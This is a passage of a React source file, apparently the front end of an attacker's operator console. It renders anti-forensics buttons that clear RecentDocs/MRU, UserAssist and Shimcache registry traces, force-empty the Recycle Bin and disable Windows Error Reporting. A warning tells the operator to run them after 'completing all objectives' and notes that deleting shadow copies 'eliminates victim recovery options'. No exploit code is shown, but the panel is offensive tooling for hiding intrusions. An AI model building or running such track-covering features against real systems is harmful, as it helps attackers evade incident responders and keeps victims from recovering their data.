                  { label: "Clear RecentDocs + MRU",      action: "clear_logs",  desc: "HKCU registry recent file access trails",                       danger: false },
                  { label: "Empty Recycle Bin",           action: "clear_logs",  desc: "Clear-RecycleBin -Force",                                       danger: false },
                  { label: "Disable Windows Error Reporting", action: "clear_logs", desc: "wer.dll crash reporting sends artifacts to Microsoft",       danger: false },
                  { label: "Clear UserAssist + Shimcache", action: "clear_logs", desc: "Program execution forensics in registry — high-value for IR",  danger: false },
                ].map(({ label, action, desc, danger }) => (
                  <button key={label} onClick={() => runAction(action, label)} disabled={!!loading || !session}
                    className={`text-left p-4 border rounded transition-all disabled:opacity-40 ${
                      danger ? "border-red-900/20 hover:border-red-700/40 hover:bg-red-950/10" : "border-green-900/20 hover:border-green-700/30"
                    }`}>
                    <div className={`text-[9px] mb-1 ${danger ? "text-red-400" : "text-green-500"}`}>{label}</div>
                    <div className="text-[7px] text-green-900/40">{desc}</div>
                    {danger && <div className="text-[7px] text-red-900/40 mt-1">⚠ IRREVERSIBLE</div>}
                  </button>
                ))}
              </div>
              <div className="border border-red-900/10 rounded p-3 text-[8px] text-red-900/50">
                ⚠ All log clearing operations are IRREVERSIBLE. Run only after completing all objectives. Deleting shadow copies eliminates victim recovery options.
              </div>
            </div>
          )}
        </div>

        {/* ── OPERATION LOG STRIP ── */}
        <div className="h-32 border-t border-green-900/20 bg-black/40 p-2 overflow-y-auto">
          <div className="text-[7px] text-green-900/40 tracking-widest mb-1">OPERATION LOG</div>
          {log.length === 0 ? (
            <div className="text-[8px] text-green-900/20">Awaiting commands…</div>
          ) : log.map((l, i) => (
            <div key={i} className={`text-[8px] font-mono leading-5 ${
              l.includes("✓") ? "text-green-500" : l.includes("✗") ? "text-red-500" : "text-green-800"
            }`}>{l}</div>
          ))}
        </div>
      </div>
    </div>
  );
}
